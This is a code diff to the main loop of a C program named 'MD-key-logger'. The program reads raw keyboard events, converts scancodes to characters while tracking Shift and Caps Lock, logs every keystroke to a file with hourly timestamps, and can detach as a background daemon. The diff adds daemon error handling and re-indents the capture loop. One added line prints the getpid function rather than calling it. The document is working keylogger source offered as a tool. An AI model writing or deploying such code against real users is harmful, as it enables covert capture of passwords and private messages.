@@ -60,7 +60,7 @@ int main(int argc, char **argv) {
                         " Usage: [OPTION]...\n"
                         "  -l, --log-file <file>  write log to FILE (default=/var/log/MD-key-logger.log)\n"
                         "  -d, --daemon  run as daemon\n"
-                        "  -p, --pid  get Process id\n"
+                        "  -p, --pid  get process id\n"
                         "  -h, --help    show this message\n"
                         "  \n");
                 return EXIT_SUCCESS;
@@ -95,64 +95,71 @@ int main(int argc, char **argv) {
     }
 
     if (daemon_mod) {
-        change_task_to_background();
+        if (change_task_to_background() == 0) {
+            if (pid_mod == true) {
+                printf("Process ID = %d \n", getpid);
+            }
+        }else{
+            perror("Error");
+        }
     }
 
-    get_time_now(time_string);
-    fprintf(log, "\n Starting key logger: %s\n", time_string);
-    bzero(time_string, 80);
-    start = clock();
 
-    while (readable > 0) {
-        readable = read(get_stream_key, &ev, sizeof (ev));
+get_time_now(time_string);
+fprintf(log, "\n Starting key logger: %s\n", time_string);
+bzero(time_string, 80);
+start = clock();
 
-        if (ev.value == 1 && ev.type == 1) // Pressed a key
+while (readable > 0) {
+    readable = read(get_stream_key, &ev, sizeof (ev));
+
+    if (ev.value == 1 && ev.type == 1) // Pressed a key
+    {
+        if (ev.code == 58) // Caps Lock = 58
         {
-            if (ev.code == 58) // Caps Lock = 58
-            {
-                if (caps_pressed) {
-                    caps_pressed = false;
-                } else {
-                    caps_pressed = true;
-                }
-            }
-
-            if (ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
-            {
-                shift_pressed = true;
-            }
-
-            if (shift_pressed) {
-                fprintf(log, "%s", shift_scancode_to_ascii[ev.code]);
-                fflush(log);
-            } else if (caps_pressed) {
-                fprintf(log, "%s", caps_scancode_to_ascii[ev.code]);
-                fflush(log);
+            if (caps_pressed) {
+                caps_pressed = false;
             } else {
-                fprintf(log, "%s", scancode_to_ascii[ev.code]);
-                fflush(log);
-            }
-
-        } else if (ev.value == 0) // Released a key
-        {
-            if (ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
-            {
-                shift_pressed = false;
+                caps_pressed = true;
             }
         }
-        end = clock();
-        if ((((end - start)) / CLOCKS_PER_SEC) >= 3600) { // log time every one hour
-            get_time_now(time_string);
-            fprintf(log, "\n%s\n", time_string);
+
+        if (ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
+        {
+            shift_pressed = true;
+        }
+
+        if (shift_pressed) {
+            fprintf(log, "%s", shift_scancode_to_ascii[ev.code]);
             fflush(log);
-            start = 0;
-            end = 0;
-            bzero(time_string, 80);
+        } else if (caps_pressed) {
+            fprintf(log, "%s", caps_scancode_to_ascii[ev.code]);
+            fflush(log);
+        } else {
+            fprintf(log, "%s", scancode_to_ascii[ev.code]);
+            fflush(log);
+        }
+
+    } else if (ev.value == 0) // Released a key
+    {
+        if (ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
+        {
+            shift_pressed = false;
         }
     }
+    end = clock();
+    if ((((end - start)) / CLOCKS_PER_SEC) >= 3600) { // log time every one hour
+        get_time_now(time_string);
+        fprintf(log, "\n%s\n", time_string);
+        fflush(log);
+        start = 0;
+        end = 0;
+        bzero(time_string, 80);
+    }
+}
 
-    fclose(log);
-    close(get_stream_key);
+fclose(log);
+close(get_stream_key);
 
-    return EXIT_SUCCESS;
+return EXIT_SUCCESS;
 }
